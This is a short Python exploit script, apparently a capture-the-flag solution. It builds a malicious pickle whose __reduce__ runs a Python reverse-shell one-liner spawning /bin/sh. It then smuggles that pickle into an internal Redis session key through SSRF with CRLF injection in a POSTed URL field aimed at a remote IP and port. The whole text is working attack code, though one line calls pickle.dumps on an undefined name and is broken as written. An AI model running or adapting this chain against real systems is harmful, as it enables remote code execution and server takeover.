#!/usr/bin/env/ python
import pickle
import requests
import os
class shell(object):
    def __reduce__(self):
        a = """python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("127.0.0.1",9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"""
        return (os.system,(a,))    

hack = pickle.dumps(hack)

website = "https://140.112.90.54:10163/"

post = "url=http://redis:6379/?q=HTTP/1.1%0d%0aSET session:469ce4a7-1c1c-484a-b56e-4f1180c335c3 {} %0d%0aHeader2:%0d%0a".format(hack)
r = requests.post(url = website, data = {'url': post})

print(r.text)
